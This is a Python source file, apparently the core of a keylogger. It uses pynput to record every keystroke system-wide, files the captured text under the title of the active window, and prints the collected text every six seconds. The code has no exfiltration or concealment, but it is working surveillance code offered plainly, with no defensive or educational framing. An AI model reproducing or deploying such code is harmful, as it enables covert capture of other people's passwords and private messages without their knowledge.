from pynput import keyboard
import threading
import time
from window import get_active_window_title

class Listener:
    def __init__(self):
        self.data = {}
        self.listener = None
        self.running = False

    def on_press(self, key):
        window = str(get_active_window_title())
        if window not in self.data:
            self.data[window] = []
        try:
            self.data[window].append(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.data[window].append(" ")
            elif key == keyboard.Key.enter:
                self.data[window].append("\n")

    def run(self):
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        if self.listener and self.running:
            self.listener.stop()
            self.running = False

    def get_keys(self):
        text = {}
        for k,v in self.data.items():
            text[k] = "".join(v)
        self.data.clear()
        return text


if __name__ == "__main__":
    a = Listener()
    a.run()


    while True:
        time.sleep(6)
        print(a.get_keys())

